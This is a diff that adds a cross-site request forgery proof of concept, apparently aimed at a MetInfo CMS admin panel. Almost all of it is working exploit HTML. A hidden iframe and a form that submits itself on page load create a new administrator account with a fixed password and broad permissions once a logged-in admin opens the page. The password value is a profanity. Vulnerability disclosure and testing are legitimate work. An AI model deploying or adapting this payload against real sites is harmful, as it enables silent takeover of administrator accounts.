@@ -1,0 +1,29 @@
+
+After the administrator logged in, open the following two page
+poc：
+one.html---add a admin
+<html>
+  <!-- CSRF PoC - Test echod -->
+  <body>
+    <iframe width="0" height="0" name="echodframe"></iframe>
+    <form name="echod" action="http://127.0.0.1/mituo/admin/index.php?lang=cn&anyid=47&n=admin&c=admin_admin&a=doaddsave" method="POST" target="echodframe">
+      <input type="hidden" name="id" value="" />
+      <input type="hidden" name="admin_id" value="admin99999" />
+      <input type="hidden" name="admin_pass" value="caonima" />
+      <input type="hidden" name="admin_pass_replay" value="caonima" />
+      <input type="hidden" name="admin_name" value="admins" />
+      <input type="hidden" name="admin_group" value="3" />
+      <input type="hidden" name="langok" value="&#35;metinfo&#35;&#124;cn&#124;en" />
+      <input type="hidden" name="admin_pop" value="s1007&#124;s1201&#124;s1002&#124;s1003&#124;s1104" />
+      <input type="hidden" name="admin_op" value="metinfo&#124;add&#124;editor&#124;del" />
+      <input type="hidden" name="admin_pop_str" value="s1801&#124;s1802&#124;&#35;metinfo&#35;&#124;s1301&#124;s9999&#124;c34&#124;c3&#124;c4&#124;c42&#124;c72&#124;c38&#124;c44&#124;c43&#124;c55&#124;c47&#124;c48&#124;c70&#124;c52&#124;c71&#124;c53&#124;s1106&#124;s1404&#124;s1406&#124;s1101&#124;s1102&#124;s1505&#124;s1507&#124;a50002&#124;a10070&#124;a0&#124;s1601&#124;s1603&#124;s1004&#124;s1005&#124;s1007&#124;s1201&#124;s1002&#124;s1003&#124;s1104" />
+ 
+    </form>
+<script>document.echod.submit();
+
+
+</script>
+
+ 
+  </body>
+</html>
